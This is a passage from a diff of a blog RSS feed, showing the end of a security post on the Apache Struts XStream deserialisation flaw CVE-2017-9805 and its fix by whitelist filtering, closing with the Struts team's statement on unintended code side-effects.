has-luminous-vivid-amber-color"><em>Action</em>Invocation</span></a></em>. This is used to set the permissions on the <em><span class="has-inline-color has-white-color">XStream</span> </em>XML parser &#8211; effectively applying a whitelist filter to the deserialised data content before it is used to construct a Java object:</p>
+
+
+
+<figure class="wp-block-image size-large"><a href="./../../../wp-content/uploads/2021/09/mcafee_001.png"><img loading="lazy" decoding="async" width="1024" height="434" src="./../../../wp-content/uploads/2021/09/mcafee_001-1024x434.png" alt="" class="wp-image-455" srcset="./../../../wp-content/uploads/2021/09/mcafee_001-1024x434.png 1024w, ./../../../wp-content/uploads/2021/09/mcafee_001-300x127.png 300w, ./../../../wp-content/uploads/2021/09/mcafee_001-768x326.png 768w, ./../../../wp-content/uploads/2021/09/mcafee_001-210x89.png 210w, ./../../../wp-content/uploads/2021/09/mcafee_001.png 1106w" sizes="(max-width: 980px) 100vw, 980px" /></a></figure>
+
+
+<h2 class="wp-block-heading" id="summary">Summary</h2>
+
+
+<p>I think the following <a href="https://blogs.apache.org/foundation/entry/apache-struts-statement-on-equifax"><span class="has-inline-color has-luminous-vivid-amber-color">quote from the Apache Struts development team</span></a> in response to CVE-2017-9805 epitomises the view outlined at the beginning of this post &#8211; that in the drive to deliver functionality, it is all too easy to introduce vulnerabilities unwittingly, unless security requirements are given the same level of importance as functional and other non-functional requirements from the outset:</p>
+
+
+
+<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"><p>Regarding the assertion that especially CVE-2017-9805 is a nine year old security flaw, one has to understand that there is a huge difference between detecting a flaw after nine years and knowing about a flaw for several years. If the latter was the case, the team would have had a hard time to provide a good answer why they did not fix this earlier. But this was actually not the case here &#8211; we were notified just recently on how a certain piece of code can be misused, and we fixed this ASAP. What we saw here is common software engineering business &#8211; <span class="has-inline-color has-vivid-red-color">people write code for achieving a desired function, but may not be aware of undesired side-effects</span>. Once this awareness is reached, we as well as hopefully all other library and framework maintainers put high efforts into removing the side-effects as soon as possible.</p><cite><a href="https://blogs.apache.org/foundation/entry/apache-struts-statement-on-equifax" target="_blank" rel="noreferrer noopener">https://blogs.apache.org/foundation/entry/apache-struts-statement-on-equifax</a></cite></blockquote>
+
+
+
+<p></p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+	</channel>
+</rss>
